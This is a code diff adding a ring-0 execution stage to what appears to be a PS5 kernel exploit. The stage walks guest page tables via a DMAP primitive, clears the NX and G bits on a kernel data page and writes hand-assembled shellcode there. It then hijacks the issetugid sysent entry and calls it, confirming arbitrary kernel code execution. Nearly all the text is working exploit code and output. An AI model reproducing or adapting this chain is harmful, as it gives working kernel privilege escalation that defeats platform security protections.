@@ -2206,8 +2206,10 @@ ring3_fallback:
             fflush(stdout);
         }
 
-        /* Variables hoisted for use by both sysent dump and verification */
+        /* Variables hoisted for use by sysent dump, verification, and
+         * ring-0 execution */
         int sysent_found = 0;
+        int sysent_verified = 0;
         uint64_t sysent_kva = 0;
 
         /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
@@ -2413,7 +2415,7 @@ ring3_fallback:
 
             /* 12/12 narg match is strong proof. PS5 has ~117 custom Sony
              * syscalls in 600-723, so nosys count is just informational. */
-            int sysent_verified = (narg_ok == narg_total && narg_total >= 10);
+            sysent_verified = (narg_ok == narg_total && narg_total >= 10);
             if (sysent_verified)
                 printf("[+] Sysent table VERIFIED (12/12 narg match)!\n");
             else
@@ -2995,6 +2997,277 @@ ring3_fallback:
             }
             fflush(stdout);
         }
+
+        /* ================================================================
+         * Ring-0 Shellcode Execution via Guest PTE NX-bit Clear
+         * ================================================================
+         *
+         * PROVEN: NPT maps kdata as RW+X (no NX at PA 0x6a000/0x6e000).
+         * PROVEN: Guest PTE for kdata has NX=1 (bit 63) — the ONLY barrier.
+         * PROVEN: Sysent hooks redirect standard syscalls to any ktext addr.
+         *
+         * Attack plan:
+         *   1. Write minimal shellcode to kdata code cave via DMAP
+         *   2. Clear NX+G in the guest PTE via DMAP write
+         *   3. Hook sysent[253] (issetugid) to point to shellcode
+         *   4. Call syscall(253) → ring-0 execution!
+         *   5. Restore PTE + sysent + code cave content
+         *
+         * TLB concern: PTE has A=0 → page likely not in TLB.
+         * We clear G too so CR3 reloads will flush if cached.
+         * ================================================================ */
+        if (sysent_verified && sysent_kva != 0) {
+            printf("=============================================\n");
+            printf("  Ring-0 Execution: PTE NX-bit Clear Attack\n");
+            printf("=============================================\n\n");
+            fflush(stdout);
+
+            /* Target: kdata_base (first page, known code cave) */
+            uint64_t target_kva = g_kdata_base;
+            uint64_t target_pa = va_to_pa_quiet(target_kva);
+
+            /* Walk guest PT to find the PTE for target_kva */
+            uint64_t walk_e;
+            uint64_t walk_pa;
+            /* PML4 → PDP → PD → PTE */
+            walk_pa = g_cr3_phys + ((target_kva >> 39) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+
+            walk_pa = (walk_e & PTE_PA_MASK) +
+                      ((target_kva >> 30) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+            if (walk_e & PTE_PS) {
+                printf("[-] kdata mapped as 1GB page, not 4KB PTE.\n");
+                goto r0_skip;
+            }
+
+            walk_pa = (walk_e & PTE_PA_MASK) +
+                      ((target_kva >> 21) & 0x1FF) * 8;
+            kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+            if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+            /* Check for 2MB page — handle differently */
+            uint64_t pte_pa;
+            uint64_t orig_pte;
+            int is_pde_2mb = (walk_e & PTE_PS) != 0;
+            if (is_pde_2mb) {
+                /* PDE is the final level (2MB page) */
+                pte_pa = (walk_e & PTE_PA_MASK) +
+                         ((target_kva >> 21) & 0x1FF) * 8;
+                /* Re-read using the PDE address */
+                pte_pa = walk_pa; /* walk_pa IS the PDE address */
+                kernel_copyout(g_dmap_base + pte_pa, &orig_pte, 8);
+                printf("[*] kdata mapped as 2MB page (PDE at PA 0x%lx)\n",
+                       (unsigned long)pte_pa);
+            } else {
+                /* Walk to PT level */
+                walk_pa = (walk_e & PTE_PA_MASK) +
+                          ((target_kva >> 12) & 0x1FF) * 8;
+                kernel_copyout(g_dmap_base + walk_pa, &walk_e, 8);
+                if (!(walk_e & PTE_PRESENT)) goto r0_skip;
+                pte_pa = walk_pa;
+                orig_pte = walk_e;
+            }
+
+            printf("[*] Target: kdata_base KVA=0x%lx PA=0x%lx\n",
+                   (unsigned long)target_kva, (unsigned long)target_pa);
+            printf("[*] PTE at PA 0x%lx: 0x%016lx\n",
+                   (unsigned long)pte_pa, (unsigned long)orig_pte);
+            printf("    NX=%d RW=%d G=%d A=%d\n",
+                   (int)(orig_pte >> 63), (int)((orig_pte >> 1) & 1),
+                   (int)((orig_pte >> 8) & 1), (int)((orig_pte >> 5) & 1));
+            fflush(stdout);
+
+            if (!(orig_pte >> 63)) {
+                printf("[!] NX already clear — page is already executable?!\n");
+                goto r0_skip;
+            }
+
+            /* Step 1: Save original kdata content and write shellcode.
+             *
+             * Shellcode (29 bytes):
+             *   mov rax, <DMAP_KVA_of_shared_buf>  ; 10 bytes
+             *   mov rdx, <magic>                    ; 10 bytes
+             *   mov [rax], rdx                      ; 3 bytes
+             *   xor eax, eax                        ; 2 bytes
+             *   ret                                 ; 1 byte
+             *
+             * Writes 0xDEAD_RING_0000_0000 to shared buffer, returns 0.
+             */
+            uint8_t r0_shellcode[32];
+            int sc_len = 0;
+            uint64_t sc_magic = 0xDEAD000052494E47ULL; /* "RING" + marker */
+
+            /* mov rax, imm64 */
+            r0_shellcode[sc_len++] = 0x48;
+            r0_shellcode[sc_len++] = 0xB8;
+            memcpy(&r0_shellcode[sc_len], &result_kva, 8);
+            sc_len += 8;
+
+            /* mov rdx, imm64 */
+            r0_shellcode[sc_len++] = 0x48;
+            r0_shellcode[sc_len++] = 0xBA;
+            memcpy(&r0_shellcode[sc_len], &sc_magic, 8);
+            sc_len += 8;
+
+            /* mov [rax], rdx */
+            r0_shellcode[sc_len++] = 0x48;
+            r0_shellcode[sc_len++] = 0x89;
+            r0_shellcode[sc_len++] = 0x10;
+
+            /* xor eax, eax */
+            r0_shellcode[sc_len++] = 0x31;
+            r0_shellcode[sc_len++] = 0xC0;
+
+            /* ret */
+            r0_shellcode[sc_len++] = 0xC3;
+
+            printf("\n[*] Step 1: Writing %d-byte shellcode to kdata via DMAP...\n",
+                   sc_len);
+
+            /* Save original bytes */
+            uint8_t r0_backup[64];
+            kernel_copyout(g_dmap_base + target_pa, r0_backup, sc_len);
+
+            /* Write shellcode */
+            kernel_copyin(r0_shellcode, g_dmap_base + target_pa, sc_len);
+
+            /* Verify */
+            uint8_t r0_verify[32];
+            kernel_copyout(g_dmap_base + target_pa, r0_verify, sc_len);
+            int sc_match = (memcmp(r0_shellcode, r0_verify, sc_len) == 0);
+            printf("    Write verify: %s\n", sc_match ? "OK" : "MISMATCH");
+            printf("    Bytes: ");
+            for (int i = 0; i < sc_len; i++) printf("%02x ", r0_verify[i]);
+            printf("\n");
+            fflush(stdout);
+
+            if (!sc_match) {
+                printf("[-] Shellcode write failed, aborting.\n");
+                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+                goto r0_skip;
+            }
+
+            /* Step 2: Clear NX (bit 63) and G (bit 8) in guest PTE.
+             * Clearing G ensures the TLB entry (if cached) will be
+             * flushed on the next CR3 reload (context switch). */
+            printf("[*] Step 2: Clearing NX+G in guest PTE...\n");
+            uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
+            printf("    Old PTE: 0x%016lx (NX=%d G=%d)\n",
+                   (unsigned long)orig_pte,
+                   (int)(orig_pte >> 63), (int)((orig_pte >> 8) & 1));
+            printf("    New PTE: 0x%016lx (NX=%d G=%d)\n",
+                   (unsigned long)new_pte,
+                   (int)(new_pte >> 63), (int)((new_pte >> 8) & 1));
+
+            kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+            /* Verify PTE write */
+            uint64_t pte_rb;
+            kernel_copyout(g_dmap_base + pte_pa, &pte_rb, 8);
+            printf("    PTE readback: 0x%016lx [%s]\n",
+                   (unsigned long)pte_rb,
+                   pte_rb == new_pte ? "OK" : "MISMATCH");
+            fflush(stdout);
+
+            if (pte_rb != new_pte) {
+                printf("[-] PTE write failed, restoring and aborting.\n");
+                kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+                goto r0_skip;
+            }
+
+            /* Step 3: Clear shared buffer to detect fresh writes */
+            printf("[*] Step 3: Clearing shared buffer...\n");
+            uint64_t zero = 0;
+            kernel_copyin(&zero, g_dmap_base + cpu_pa, 8);
+
+            /* Step 4: Hook sysent[253] to kdata_base and call */
+            printf("[*] Step 4: Hooking sysent[253] → kdata_base (0x%lx)...\n",
+                   (unsigned long)target_kva);
+            fflush(stdout);
+
+            /* Save original sysent[253] */
+            uint64_t s253_kva = sysent_kva + 253ULL * SYSENT_STRIDE;
+            uint64_t s253_pa = va_to_pa_quiet(s253_kva);
+            uint8_t s253_orig[SYSENT_STRIDE];
+            kernel_copyout(g_dmap_base + s253_pa, s253_orig, SYSENT_STRIDE);
+
+            /* Write target_kva into sysent[253].sy_call */
+            uint64_t s253_call_pa = va_to_pa_quiet(s253_kva + 8);
+            kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+
+            /* Set narg=0 */
+            int32_t narg_zero = 0;
+            uint64_t s253_narg_pa = va_to_pa_quiet(s253_kva);
+            kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+            /* Verify hook */
+            uint64_t hook_rb;
+            kernel_copyout(g_dmap_base + s253_call_pa, &hook_rb, 8);
+            printf("    sysent[253].sy_call = 0x%lx [%s]\n",
+                   (unsigned long)hook_rb,
+                   hook_rb == target_kva ? "OK" : "MISMATCH");
+            fflush(stdout);
+
+            /* CALL THE HOOKED SYSCALL — this is the ring-0 moment */
+            printf("[*] Calling syscall(253) — executing shellcode in ring 0...\n");
+            fflush(stdout);
+            errno = 0;
+            long r0_ret = syscall(253);
+            int r0_err = errno;
+            printf("    syscall(253) returned: %ld, errno=%d\n",
+                   r0_ret, r0_err);
+
+            /* Step 5: IMMEDIATELY restore everything */
+            printf("[*] Step 5: Restoring PTE, sysent, code cave...\n");
+
+            /* Restore sysent[253] */
+            kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+
+            /* Restore PTE (put NX+G back) */
+            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+
+            /* Restore kdata content */
+            kernel_copyin(r0_backup, g_dmap_base + target_pa, sc_len);
+
+            printf("    All restored.\n");
+            fflush(stdout);
+
+            /* Step 6: Check shared buffer for magic */
+            uint64_t buf_check;
+            kernel_copyout(g_dmap_base + cpu_pa, &buf_check, 8);
+            printf("\n[*] Shared buffer value: 0x%016lx\n",
+                   (unsigned long)buf_check);
+
+            if (buf_check == sc_magic) {
+                printf("[+] ============================================\n");
+                printf("[+]  RING-0 CODE EXECUTION CONFIRMED!\n");
+                printf("[+] ============================================\n");
+                printf("[+] Shellcode wrote magic 0x%lx to shared buffer.\n",
+                       (unsigned long)sc_magic);
+                printf("[+] Attack chain: PTE NX-clear + sysent hook → ring 0\n");
+                printf("[+] We have arbitrary kernel code execution.\n");
+            } else if (buf_check != 0) {
+                printf("[?] Buffer has unexpected value: 0x%lx\n",
+                       (unsigned long)buf_check);
+                printf("    Partial execution or different code path.\n");
+            } else {
+                printf("[-] Buffer still zero — shellcode did not execute.\n");
+                if (r0_err != 0) {
+                    printf("    errno=%d suggests a fault occurred.\n", r0_err);
+                    printf("    Likely: stale TLB entry with NX=1.\n");
+                    printf("    Need: invlpg or CR4.PGE toggle to flush.\n");
+                } else {
+                    printf("    But no error either — investigate.\n");
+                }
+            }
+            printf("\n");
+            fflush(stdout);
+        }
+
+r0_skip: ;
 
 idt_done: ;
 idt_skip: ;
